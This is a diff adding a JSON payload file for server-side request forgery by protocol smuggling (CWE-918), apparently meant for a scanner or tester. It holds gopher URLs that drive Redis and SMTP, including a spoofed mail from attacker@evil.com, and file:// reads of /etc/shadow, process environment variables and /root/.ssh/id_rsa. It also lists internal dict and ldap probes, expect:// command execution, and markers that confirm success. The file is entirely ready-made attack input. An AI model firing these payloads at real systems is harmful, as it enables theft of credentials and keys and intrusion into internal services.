@@ -1,0 +1,17 @@
+{
+  "variants": {
+    "gopher": ["gopher://127.0.0.1:6379/_INFO", "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0ASubject:%20Test%0A%0ATest%0A.%0AQUIT%0A", "gopher://127.0.0.1:6379/_SET%20foo%200%0AEXPIRE%20foo%20100%0AQUIT%0A"],
+    "file": ["file:///etc/passwd", "file:///etc/shadow", "file:///proc/self/environ", "file:///C:/Windows/win.ini", "file:///proc/self/cmdline", "file:///var/log/auth.log", "file:///root/.ssh/id_rsa"],
+    "dict": ["dict://localhost:6379/INFO", "dict://localhost:11211/stats", "dict://internal-host:port/"],
+    "ldap": ["ldap://localhost:389/", "ldap://localhost:389/dc=example,dc=com", "ldaps://localhost:636/"],
+    "tftp": ["tftp://localhost/etc/passwd", "tftp://internal-host/file"],
+    "expect": ["expect://id", "expect://whoami"],
+    "ftp": ["ftp://user:pass@internal-host/file", "ftp://anonymous:anonymous@internal-host/"]
+  },
+  "payloads": ["file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://localhost:6379/INFO", "ldap://localhost:389/", "file:///proc/self/environ"],
+  "markers": ["root:x:0:0", "[boot loader]", "mssql", "redis_version", "STAT ", "dc=example"],
+  "metadata": {
+    "cwe": "CWE-918",
+    "technique": "Protocol smuggling SSRF"
+  }
+}
